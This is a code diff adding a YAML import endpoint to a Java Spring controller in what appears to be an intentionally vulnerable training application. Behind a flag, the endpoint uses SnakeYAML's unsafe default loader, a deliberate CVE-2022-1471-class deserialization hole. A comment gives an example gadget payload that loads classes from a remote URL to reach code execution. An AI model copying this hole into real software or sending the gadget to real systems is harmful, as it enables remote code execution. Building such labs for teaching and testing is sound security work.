@@ -7,6 +7,9 @@ import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.*;
 import org.springframework.web.server.ResponseStatusException;
 import org.w3c.dom.Document;
+import org.yaml.snakeyaml.LoaderOptions;
+import org.yaml.snakeyaml.Yaml;
+import org.yaml.snakeyaml.constructor.SafeConstructor;
 
 import javax.xml.parsers.DocumentBuilder;
 import javax.xml.parsers.DocumentBuilderFactory;
@@ -96,6 +99,30 @@ public class ImportController {
             return ResponseEntity.ok().contentType(MediaType.TEXT_PLAIN).body(text);
         } catch (Exception e) {
             throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "XML parse hatasi: " + e.getMessage());
+        }
+    }
+
+    /**
+     * SnakeYAML unsafe load (CVE-2022-1471 sinifi deserialization).
+     *  - vuln.import.yaml=true  -> new Yaml().load() ile herhangi bir Java tipi
+     *    ornegi olusturulur; "!!" etiketli gadget'larla RCE'ye kadar gidilebilir.
+     *    ornek gadget: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://internal:80/"]]]]
+     *  - false -> SafeConstructor: yalnizca standart tipler, keyfi sinif reddedilir.
+     */
+    @PostMapping("/yaml")
+    public ResponseEntity<String> importYaml(@RequestBody String body) {
+        boolean unsafe = vuln.isEnabled() && vuln.getImport().isYaml();
+        try {
+            Yaml yaml = unsafe
+                    ? new Yaml() // VULN: guvensiz varsayilan Constructor
+                    : new Yaml(new SafeConstructor(new LoaderOptions()));
+            Object result = yaml.load(body);
+            String type = (result == null) ? "null" : result.getClass().getName();
+            return ResponseEntity.ok()
+                    .contentType(MediaType.TEXT_PLAIN)
+                    .body("loaded type=" + type + " value=" + result);
+        } catch (Exception e) {
+            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "YAML parse hatasi: " + e.getMessage());
         }
     }
 
